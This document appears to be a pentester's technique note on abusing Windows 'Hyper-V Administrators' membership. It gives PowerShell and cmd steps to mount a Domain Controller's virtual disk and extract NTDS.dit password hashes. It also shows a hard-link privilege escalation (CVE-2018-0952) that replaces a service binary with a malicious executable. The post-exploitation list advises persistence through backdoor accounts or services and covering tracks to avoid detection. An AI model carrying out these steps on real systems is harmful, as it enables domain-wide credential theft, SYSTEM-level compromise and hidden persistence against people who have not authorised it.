### Technique Name:

Hyper-V Administrators
### Summary:

The `Hyper-V Administrators` group has unrestricted control over all Hyper-V virtual machines. If Domain Controllers are virtualized, a Hyper-V admin can exfiltrate the domain's NTDS.dit file by cloning or mounting the controller's virtual disk. Additionally, specific race condition and hard link vulnerabilities in Hyper-V's file handling (e.g., CVE-2018-0952, CVE-2019-0841) can be used to gain SYSTEM privileges via privilege escalation.
### Conditions:

- Target is running Hyper-V (Windows Server with Hyper-V role)    
- Attacker has membership in the `Hyper-V Administrators` group
- Domain Controller is virtualized (for NTDS.dit extraction)
- Vulnerability such as CVE-2018-0952 or CVE-2019-0841 is unpatched (for local escalation)
- Writable or startable services installed (e.g., Mozilla Maintenance Service)
### Enumeration:

```powershell
# Check group membership
net localgroup "Hyper-V Administrators"

# List installed VMs and their paths (requires elevated access)
Get-VM
Get-VMHardDiskDrive

# List files in VHD location
Get-ChildItem -Path "C:\ProgramData\Microsoft\Windows\Hyper-V\Virtual Hard Disks"

# Check for exploitable services
sc qc MozillaMaintenance
```
### Exploitation:

```powershell
# Clone or mount VHDX from Domain Controller (offline NTDS.dit extraction)
# Requires access to the VHD file:
Mount-VHD -Path "C:\Path\to\dc01.vhdx" -ReadOnly
# Use tools like ntdsutil or secretsdump.py on mounted image

# NT Hard Link Exploitation Example (for CVE-2018-0952)
# Replace target .vhdx with a hard link to a protected SYSTEM file
# This may cause SYSTEM to reset permissions on the file to attacker-controlled

# Taking ownership after SYSTEM modifies it:
takeown /F "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

# Replace with malicious binary and start service
copy malicious.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
sc start MozillaMaintenance
```
### Post-Exploitation:

- If Domain Controller VM was mounted: extract NTLM hashes from NTDS.dit using tools like `secretsdump.py`, `ntdsutil`, or `impacket`.    
- If SYSTEM was obtained via service abuse, establish persistence (e.g., new admin user, backdoor service)
- Remove or restore overwritten services or binaries to avoid detection
- Ensure that audit logs and service start events are reviewed
- If applicable, inform client to apply mitigations to block hard link abuse
# Tags
> #Windows-Post-Exploitation #Windows-Privesc #Privileged_Groups 